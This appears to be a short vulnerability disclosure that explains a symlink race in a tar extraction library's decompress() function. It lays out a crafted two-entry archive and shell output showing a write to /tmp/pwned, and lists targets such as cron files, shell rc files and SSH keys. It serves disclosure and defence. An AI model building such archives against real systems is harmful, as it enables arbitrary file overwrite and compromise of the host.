The bug, in one picture

malicious.tar — two entries, same name
[entry 1]  type=symlink
           name='aaaaa'
           linkname='/tmp/pwned'

[entry 2]  type=file
           name='aaaaa'
           data='ARBITRARY WRITE'
           mode=0644
After decompress() resolves
$ ls -la dist/
lrwxrwxrwx  aaaaa -> /tmp/pwned

$ cat /tmp/pwned
ARBITRARY WRITE

The symlink check is per-entry. Entry 2 looks at dist/aaaaa — nothing there yet — check passes. Meanwhile entry 1 races ahead, plants the symlink. Then entry 2's writeFile follows it.

Effect Anywhere the running process can write — cron files, shell rc, SSH keys, package hooks, build outputs — the attacker can write.
